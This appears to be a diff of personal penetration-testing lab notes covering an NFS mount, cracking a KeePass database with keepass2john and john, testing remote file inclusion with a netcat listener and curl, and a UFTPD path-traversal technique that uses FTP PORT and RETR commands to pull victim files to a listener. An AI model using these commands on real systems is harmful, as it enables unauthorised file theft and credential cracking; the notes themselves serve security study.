@@ -62,7 +62,9 @@ mount
 					/site_backups (everyone)
 		- Mount the share: mount -t nfs -o vers=3 <address of machine>:<share name or path> /mnt/nfs
 			- $ mount -t nfs -o vers=3 remote.htb:/site_backups /mnt/nfs
-			
+Cracking a kdbx file: 
+	- keepass2john file.kdbx > hash 
+	- john hash -w=rockyou.txt
 How to test for LFT:
 	- nc -lnvp 80
 	- curl http://192.168.79.53:4443/site/index.php?page=http://192.168.49.79/hi 
@@ -563,13 +565,12 @@ Foothold:
 		- UFTPD traversal: 
 			- https://www.exploit-db.com/exploits/51000
 			- Example: 
-				- sudo nc -lvnp 9001 > shell.kdbx
-				- nc 192.168.1xx.110 21
-					- PORT 192,168,xx,1xx,1,2
-					- RETR ../../../opt/shell.kdbx
-					- keepass2john shell.kdbx > hash.txt
-					- john hash.txt –wordlist=/opt/wordlists/rockyou.txt
-						- open that .kdbx file with the KeePass software.
+				- nc -lnvp 1258
+				- nc <Victim IP> 21
+				- USER anonymous
+				- PORT 192,168,xx,xx,1,1002
+				- RETR ../../../<file>
+			
 		- Student Attendance: https://www.exploit-db.com/exploits/48989
 		- If mountd is running: 
 			- showmount -e <victim IP>
@@ -585,6 +586,9 @@ Foothold:
 		
 					
 "/var/www/html/"
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 Privelege Escalation: 
 	Windows:
 		- Using winpeas, if the machineis vulnerable to autologon: 
